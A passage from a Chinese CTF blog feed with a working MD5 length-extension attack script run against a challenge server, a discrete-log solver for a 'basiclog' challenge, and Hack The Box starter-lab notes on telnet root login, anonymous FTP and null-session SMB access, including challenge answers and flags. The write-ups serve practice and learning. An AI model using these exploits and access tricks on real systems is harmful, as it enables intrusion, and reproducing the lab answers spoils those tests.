class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">rotate_amounts = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">                  <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">                  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">                  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">constants = [<span class="built_in">int</span>(<span class="built_in">abs</span>(math.sin(i + <span class="number">1</span>)) * <span class="number">2</span> ** <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">functions = <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (b &amp; c) | (~b &amp; d)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (d &amp; b) | (~d &amp; c)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: b ^ c ^ d] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: c ^ (b | ~d)]</span><br><span class="line"></span><br><span class="line">index_functions = <span class="number">16</span> * [<span class="keyword">lambda</span> i: i] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">7</span> * i) % <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values</span>(<span class="params">A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [A, B, C, D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">x, amount</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; amount) | (x &gt;&gt; (<span class="number">32</span> - amount))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding_message</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。</span></span><br><span class="line"><span class="string">    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span></span><br><span class="line"><span class="string">    填充的方法如下：</span></span><br><span class="line"><span class="string">        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span></span><br><span class="line"><span class="string">        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。</span></span><br><span class="line"><span class="string">    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    orig_len_in_bits = (<span class="number">8</span> * <span class="built_in">len</span>(msg)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    msg += <span class="built_in">bytes</span>([<span class="number">0x80</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">        msg += <span class="built_in">bytes</span>([<span class="number">0x00</span>])</span><br><span class="line">    msg += orig_len_in_bits.to_bytes(<span class="number">8</span>, byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    message = padding_message(message)</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> * g + <span class="number">4</span>], byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_to_hex</span>(<span class="params">digest: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    raw = digest.to_bytes(<span class="number">16</span>, byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(raw, byteorder = <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> md5_to_hex(md5(message, A, B, C, D))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_attack</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>,</span></span><br><span class="line"><span class="params">               D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> * g + <span class="number">4</span>], byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values_from_hash_str</span>(<span class="params">real_hash: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        real_hash: 真实的hash结算结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 哈希初始化值[A, B, C, D]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    str_list: <span class="type">List</span>[<span class="built_in">str</span>] = [real_hash[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="comment"># 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + s, <span class="number">16</span>).to_bytes(<span class="number">4</span>, byteorder = <span class="string">&#x27;little&#x27;</span>), byteorder = <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> s <span class="keyword">in</span> str_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5_attack_materials</span>(<span class="params">origin_msg: <span class="built_in">bytes</span>, key_len: <span class="built_in">int</span>, real_hash: <span class="built_in">str</span>, append_data: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        origin_msg: 原始的消息字节流</span></span><br><span class="line"><span class="string">        key_len: 原始密钥（盐）的长度</span></span><br><span class="line"><span class="string">        real_hash: 计算出的真实的hash值</span></span><br><span class="line"><span class="string">        append_data: 需要添加的攻击数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 发起攻击需要的物料信息</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            &#x27;attack_fake_msg&#x27;: bytes([...]),</span></span><br><span class="line"><span class="string">            &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    init_values = get_init_values_from_hash_str(real_hash)</span><br><span class="line">    <span class="comment"># print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span></span><br><span class="line">    <span class="comment"># 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span></span><br><span class="line">    fake_key: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>([<span class="number">0xff</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(key_len)])</span><br><span class="line">    <span class="comment"># 计算出加了append_data后的真实填充数据</span></span><br><span class="line">    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)</span><br><span class="line">    <span class="comment"># 攻击者提前计算添加了攻击数据的哈希</span></span><br><span class="line">    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[<span class="built_in">len</span>(padding_message(fake_key + origin_msg)):],</span><br><span class="line">                                              A = init_values[<span class="number">0</span>],</span><br><span class="line">                                              B = init_values[<span class="number">1</span>],</span><br><span class="line">                                              C = init_values[<span class="number">2</span>],</span><br><span class="line">                                              D = init_values[<span class="number">3</span>]))</span><br><span class="line">    fake_padding_data = padding_message(fake_key + origin_msg)[<span class="built_in">len</span>(fake_key + origin_msg):]</span><br><span class="line">    attack_fake_msg = origin_msg + fake_padding_data + append_data</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;attack_fake_msg&#x27;</span>: attack_fake_msg, <span class="string">&#x27;attack_hash_value&#x27;</span>: attack_hash_value&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;manqiu.top&quot;</span>,<span class="number">21535</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;msg:&quot;</span>)</span><br><span class="line">    msg = <span class="built_in">bytes</span>.fromhex(sh.recvline().strip().decode())</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sign:&quot;</span>)</span><br><span class="line">    sign = sh.recvline().strip().decode()</span><br><span class="line">    attack_data = <span class="string">b&quot;attack data&quot;</span></span><br><span class="line">    </span><br><span class="line">    attack_materials = get_md5_attack_materials(msg,<span class="number">32</span>,sign,attack_data)</span><br><span class="line">    newmsg = attack_materials[<span class="string">&#x27;attack_fake_msg&#x27;</span>]</span><br><span class="line">    newsign = attack_materials[<span class="string">&#x27;attack_hash_value&#x27;</span>]</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;msg:&quot;</span>,newmsg.<span class="built_in">hex</span>().encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;sign:&quot;</span>,newsign.encode())</span><br><span class="line">    </span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment"># VNCTF&#123;append_key_instead_of_message#6603db4e&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直观理解就是通过padding来实现md5碰撞</p><p>后面再找有靶机的题来练下 熟练使用脚本</p><h2 id="basiclog"><a href="#basiclog" class="headerlink" title="basiclog"></a>basiclog</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">&quot;************************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timeout</span>(<span class="params">*args</span>):</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = <span class="number">11769445852166501942131444325164359907623906505859865854871085543754710159882777389890225783970170353153967463136054852998337865848469266919651006863215539</span></span><br><span class="line">p = <span class="number">23538891704333003884262888650328719815247813011719731709742171087509420319765554779780451567940340706307934926272109705996675731696938533839302013726431079</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGALRM, timeout)</span><br><span class="line">signal.alarm(<span class="number">1800</span>)</span><br><span class="line"></span><br><span class="line">x = random.getrandbits(<span class="number">48</span>)</span><br><span class="line">y = <span class="built_in">pow</span>(g, <span class="built_in">pow</span>(g, x, q), p)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">_x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> x == _x:</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error...&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题是真的挺不错的</p><p>要求1800s内求出离散对数 显然sage也跑不了这么快… </p><p>可以利用中途相遇来建表 (其实就是经典的 <code>BSGS</code> 算法思想)</p><p>写出等式 <code>c = 2^((2^24)*a+b) mod q</code></p><p>相当于作了一个带余除法 a,b 都是24bit</p><p>注意到<code>c</code>其实是一个定值 我们乘以 <code>2^(-b)</code>消掉右边的<code>b</code> 就可以建立一个 <code>&#123;f(a):a&#125;</code> 的字典</p><p>在<code>O(2^24)</code>时间建完 然后<code>b</code>遍历 <code>0~2^24</code> 计算 <code>(2^c)^(2^(-b)) mod p</code> 而<code>2^c mod p </code> 就是密文<code>y</code></p><p>所以就是 <code>y^(2^(-b))</code></p><p>这样枚举直到找到字典中有的<code>a</code> 还原就能得到<code>x</code></p><p>小hint: 用<code>gmpy2</code>的<code>powmod</code>要比默认的<code>pow</code>快</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">t0 = time()</span><br><span class="line">q = <span class="number">11769445852166501942131444325164359907623906505859865854871085543754710159882777389890225783970170353153967463136054852998337865848469266919651006863215539</span></span><br><span class="line">p = <span class="number">23538891704333003884262888650328719815247813011719731709742171087509420319765554779780451567940340706307934926272109705996675731696938533839302013726431079</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">s = <span class="number">2</span>**<span class="number">24</span></span><br><span class="line">y = random.getrandbits(<span class="number">48</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;y = <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">table = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">24</span>):</span><br><span class="line">    key = powmod(<span class="number">2</span>,s*a,q)</span><br><span class="line">    table[key] = a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Dict Down!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">24</span>):</span><br><span class="line">    cur = powmod(y,powmod(<span class="number">2</span>,-b,q),p)</span><br><span class="line">    <span class="keyword">if</span> cur <span class="keyword">in</span> table.keys():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Found!&quot;</span>)</span><br><span class="line">        a = table[cur]</span><br><span class="line">        x = a*s+b</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Time Used: <span class="subst">&#123;time()-t0&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>建字典花了5min 爆破b的话 预估是在40mins左右(但是有随机浮动… 搞得我都想用pypy了) 考虑随机因素 建好表再nc的话30min应该能跑出来</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF-Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack-The-Box</title>
      <link href="/Hack-The-Box/"/>
      <url>/Hack-The-Box/</url>
      
        <content type="html"><![CDATA[<p>HackTheBox靶场</p><span id="more"></span><p>全部需要vpn<br>Register必须开全局代理才能点动 然后这个靶场必须要用openvpn进入instance下的网络环境才能打<br>要取消本地vpn的全局代理 但是又必须挂着梯子(不然打不了)…<br>这环境太难绷了…  </p><h1 id="TIER-0"><a href="#TIER-0" class="headerlink" title="TIER 0"></a>TIER 0</h1><h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><p>telnet<br>nmap扫得巨慢… 甚至根本扫不出来…<br>甚至ping都ping不通…</p><p>装作扫描出了24端口 发现可以telnet连接<br>然后以root用户名登陆就直接得到root权限了<br>getshell</p><h2 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h2><p>FTP Anonymous&#x2F;Guest Access<br>walkthrough写得挺好的<br>只是这网络环境我是真nmap扫不了一点… ping的延迟2000ms… 这扫个鬼啊…<br>但是可以直接ftp</p><p>nmap:(walkthrough)<br><img src="/Hack-The-Box/images/image.png" alt="Alt text"></p><p>直接ftp连 学习到用anonymous绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A typical misconfiguration for running FTP services allows an anonymous account to access the service like any other authenticated user. The anonymous username can be input when the prompt appears, followed by any password whatsoever since the service will disregard the password for this specific account.</span><br></pre></td></tr></table></figure><p>连接后ls 然后利用get命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get flag.txt</span><br></pre></td></tr></table></figure><p>这样将remote的文件下载到本地 然后退出cat本地.txt即可</p><p><img src="/Hack-The-Box/images/image-1.png" alt="Alt text"></p><p>跟着填一遍空 (发现HTB真的设计的特别棒)<br><a href="https://www.hackthebox.com/achievement/machine/1817836/393"><em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</a></p><h2 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h2><p>smb协议<br>学习:</p><ul><li><a href="https://app.hackthebox.com/23502c75-173d-45bf-b821-838c9fb88ede">+</a></li></ul><p>nmap:<br><img src="/Hack-The-Box/images/image-2.png" alt="Alt text"></p><p><code>smbclient -L &#123;ip&#125;</code></p><p>密码直接enter 然后可以查看到disk信息<br>在WorkShares发现能直接进<br><code>smbclient \\\\&#123;ip&#125;\\WorkShares</code><br>然后查看找flag即可</p><p><img src="/Hack-The-Box/images/image-3.png" alt="Alt text"></p><p>What does the 3-letter acronym SMB stand for?<br><code>server message blocker</code></p><p>What port does SMB use to operate at?<br><code>445</code></p><p>What is the service name for port 445 that came up in our Nmap scan?<br><code>microsoft-ds</code></p><p>What is the ‘flag’ or ‘switch’ that we can use with the smbclient utility to ‘list’ the available shares on Dancing?<br><code>-L</code></p><p>How many shares are there on Dancing?<br><code>4</code></p><p>What is the name of the share we are able to access in the end with a blank password?<br><code>WorkShares</code></p><p>What is the command we can use within the SMB shell to download the files we find?<br><code>get</code></p><p>Submit root flag<br><code>5f61c10dffbc77a704d76016a22f1664</code></p><p>pwn!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜靶场</title>
      <link href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/"/>
      <url>/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/</url>
      
